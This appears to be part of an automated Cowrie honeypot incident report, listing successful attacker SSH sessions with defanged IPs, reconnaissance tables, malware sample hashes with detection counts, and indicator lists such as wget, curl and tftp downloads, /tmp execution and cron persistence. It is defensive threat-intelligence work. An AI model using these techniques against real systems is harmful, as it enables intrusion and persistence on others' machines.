| `2026-08-04 16:41:56` | `cowrie.client.kex` |
| `2026-08-04 16:41:56` | `cowrie.login.success` |
| `2026-08-04 16:41:57` | `cowrie.session.params` |
| `2026-08-04 16:41:57` | `cowrie.command.input` |
| `2026-08-04 16:41:57` | `cowrie.log.closed` |
| `2026-08-04 16:41:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebf48269bdbb

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:43 |
| **Last Seen** | 2026-08-04 16:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:43:52` | `cowrie.session.connect` |
| `2026-08-04 16:43:52` | `cowrie.client.version` |
| `2026-08-04 16:43:52` | `cowrie.client.kex` |
| `2026-08-04 16:43:52` | `cowrie.login.success` |
| `2026-08-04 16:43:53` | `cowrie.session.params` |
| `2026-08-04 16:43:53` | `cowrie.command.input` |
| `2026-08-04 16:43:53` | `cowrie.log.closed` |
| `2026-08-04 16:43:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d55d3e8239ed

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:45 |
| **Last Seen** | 2026-08-04 16:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:45:49` | `cowrie.session.connect` |
| `2026-08-04 16:45:49` | `cowrie.client.version` |
| `2026-08-04 16:45:49` | `cowrie.client.kex` |
| `2026-08-04 16:45:49` | `cowrie.login.success` |
| `2026-08-04 16:45:50` | `cowrie.session.params` |
| `2026-08-04 16:45:50` | `cowrie.command.input` |
| `2026-08-04 16:45:50` | `cowrie.log.closed` |
| `2026-08-04 16:45:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66e31e5fa637

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]47` |
| **First Seen** | 2026-08-04 16:46 |
| **Last Seen** | 2026-08-04 16:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:46:35` | `cowrie.session.connect` |
| `2026-08-04 16:46:35` | `cowrie.client.version` |
| `2026-08-04 16:46:35` | `cowrie.client.kex` |
| `2026-08-04 16:46:35` | `cowrie.login.success` |
| `2026-08-04 16:46:36` | `cowrie.direct-tcpip.request` |
| `2026-08-04 16:46:36` | `cowrie.direct-tcpip.data` |
| `2026-08-04 16:46:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]47` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf0022e5ce91

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:47 |
| **Last Seen** | 2026-08-04 16:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:47:40` | `cowrie.session.connect` |
| `2026-08-04 16:47:40` | `cowrie.client.version` |
| `2026-08-04 16:47:40` | `cowrie.client.kex` |
| `2026-08-04 16:47:40` | `cowrie.login.success` |
| `2026-08-04 16:47:41` | `cowrie.session.params` |
| `2026-08-04 16:47:41` | `cowrie.command.input` |
| `2026-08-04 16:47:41` | `cowrie.log.closed` |
| `2026-08-04 16:47:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90a131d57621

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:49 |
| **Last Seen** | 2026-08-04 16:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:49:31` | `cowrie.session.connect` |
| `2026-08-04 16:49:31` | `cowrie.client.version` |
| `2026-08-04 16:49:31` | `cowrie.client.kex` |
| `2026-08-04 16:49:31` | `cowrie.login.success` |
| `2026-08-04 16:49:32` | `cowrie.session.params` |
| `2026-08-04 16:49:32` | `cowrie.command.input` |
| `2026-08-04 16:49:32` | `cowrie.log.closed` |
| `2026-08-04 16:49:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-027ebedbd46e

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]253` |
| **First Seen** | 2026-08-04 16:50 |
| **Last Seen** | 2026-08-04 16:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:50:43` | `cowrie.session.connect` |
| `2026-08-04 16:50:43` | `cowrie.client.version` |
| `2026-08-04 16:50:43` | `cowrie.client.kex` |
| `2026-08-04 16:50:43` | `cowrie.login.success` |
| `2026-08-04 16:50:44` | `cowrie.direct-tcpip.request` |
| `2026-08-04 16:50:44` | `cowrie.direct-tcpip.data` |
| `2026-08-04 16:50:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]253` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1ef9b2a338c

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:51 |
| **Last Seen** | 2026-08-04 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:51:24` | `cowrie.session.connect` |
| `2026-08-04 16:51:24` | `cowrie.client.version` |
| `2026-08-04 16:51:25` | `cowrie.client.kex` |
| `2026-08-04 16:51:25` | `cowrie.login.success` |
| `2026-08-04 16:51:26` | `cowrie.session.params` |
| `2026-08-04 16:51:26` | `cowrie.command.input` |
| `2026-08-04 16:51:26` | `cowrie.log.closed` |
| `2026-08-04 16:51:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39418ad05868

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:53 |
| **Last Seen** | 2026-08-04 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:53:13` | `cowrie.session.connect` |
| `2026-08-04 16:53:13` | `cowrie.client.version` |
| `2026-08-04 16:53:13` | `cowrie.client.kex` |
| `2026-08-04 16:53:14` | `cowrie.login.success` |
| `2026-08-04 16:53:14` | `cowrie.session.params` |
| `2026-08-04 16:53:14` | `cowrie.command.input` |
| `2026-08-04 16:53:14` | `cowrie.log.closed` |
| `2026-08-04 16:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41479905d3d7

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:55 |
| **Last Seen** | 2026-08-04 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:55:00` | `cowrie.session.connect` |
| `2026-08-04 16:55:00` | `cowrie.client.version` |
| `2026-08-04 16:55:01` | `cowrie.client.kex` |
| `2026-08-04 16:55:01` | `cowrie.login.success` |
| `2026-08-04 16:55:02` | `cowrie.session.params` |
| `2026-08-04 16:55:02` | `cowrie.command.input` |
| `2026-08-04 16:55:02` | `cowrie.log.closed` |
| `2026-08-04 16:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `51.158.205[.]203` | **12** | 2026-08-04 13:17 | 2026-08-04 14:13 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `91.233.83[.]203` | **10** | 2026-08-04 12:57 | 2026-08-04 16:18 | 11m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **8** | 2026-08-04 13:20 | 2026-08-04 16:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]154` | **6** | 2026-08-04 13:32 | 2026-08-04 14:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]124` | **6** | 2026-08-04 15:54 | 2026-08-04 16:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `130.12.182[.]227` | **4** | 2026-08-04 14:32 | 2026-08-04 14:32 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.186[.]172` | **4** | 2026-08-04 16:00 | 2026-08-04 16:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **3** | 2026-08-04 14:31 | 2026-08-04 15:58 | 2m | 0 | `T1592` | 🟢 LOW |
| `199.45.155[.]100` | **3** | 2026-08-04 13:31 | 2026-08-04 13:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.64.134[.]75` | **3** | 2026-08-04 14:38 | 2026-08-04 14:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `64.89.162[.]146` | **3** | 2026-08-04 16:20 | 2026-08-04 16:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]32` | **3** | 2026-08-04 15:59 | 2026-08-04 16:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]111` | **3** | 2026-08-04 15:59 | 2026-08-04 16:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]92` | **3** | 2026-08-04 14:42 | 2026-08-04 14:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.40.210[.]26` | **2** | 2026-08-04 13:59 | 2026-08-04 13:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]11` | 1 | 2026-08-04 13:21 | 2026-08-04 13:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]242` | 1 | 2026-08-04 15:15 | 2026-08-04 15:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `111.21.105[.]250` | 1 | 2026-08-04 15:54 | 2026-08-04 15:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `176.32.193[.]16` | 1 | 2026-08-04 14:23 | 2026-08-04 14:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.178.194[.]151` | 1 | 2026-08-04 16:03 | 2026-08-04 16:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.233.82[.]215` | 1 | 2026-08-04 14:11 | 2026-08-04 14:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.34.172[.]166` | 1 | 2026-08-04 16:04 | 2026-08-04 16:04 | 13s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | 1 | 2026-08-04 16:11 | 2026-08-04 16:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `36.212.31[.]122` | 1 | 2026-08-04 13:55 | 2026-08-04 13:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-08-04 13:06 | 2026-08-04 13:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]240` | 1 | 2026-08-04 13:30 | 2026-08-04 13:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.154.244[.]193` | 1 | 2026-08-04 13:30 | 2026-08-04 13:30 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.156.87[.]182` | 1 | 2026-08-04 16:45 | 2026-08-04 16:45 | 22s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-08-04 13:52 | 2026-08-04 13:53 | 35s | 0 | `T1592` | 🟢 LOW |
| `59.92.51[.]186` | 1 | 2026-08-04 12:58 | 2026-08-04 12:58 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-08-04 15:05 | 2026-08-04 15:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `73.172.8[.]81` | 1 | 2026-08-04 15:45 | 2026-08-04 15:45 | 2s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-08-04 13:33 | 2026-08-04 13:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `79.136.8[.]69` | 1 | 2026-08-04 16:03 | 2026-08-04 16:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `88.218.232[.]158` | 1 | 2026-08-04 13:40 | 2026-08-04 13:40 | 13s | 0 | `T1592` | 🟢 LOW |
| `89.151.189[.]159` | 1 | 2026-08-04 15:22 | 2026-08-04 15:22 | 12s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]72` | 1 | 2026-08-04 15:41 | 2026-08-04 15:42 | 28s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **33/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `193.34.172[.]166` | UA | New Information Systems PP | **100** ⚠️ | 0 |
| `65.20.133[.]56` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `178.178.222[.]53` | RU | PJSC MegaFon | **100** ⚠️ | 50 |
| `59.92.51[.]186` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 50 |
| `180.76.52[.]146` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 3 |
| `121.202.146[.]144` | HK | SmarTone Mobile Communications Ltd | **100** ⚠️ | 50 |
| `94.154.43[.]72` | TR | Storm Industries LLC | **100** ⚠️ | 3 |
| `220.163.252[.]244` | CN | CHINANET yunnan province network | **100** ⚠️ | 50 |
| `60.18.139[.]82` | CN | China Unicom Liaoning province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

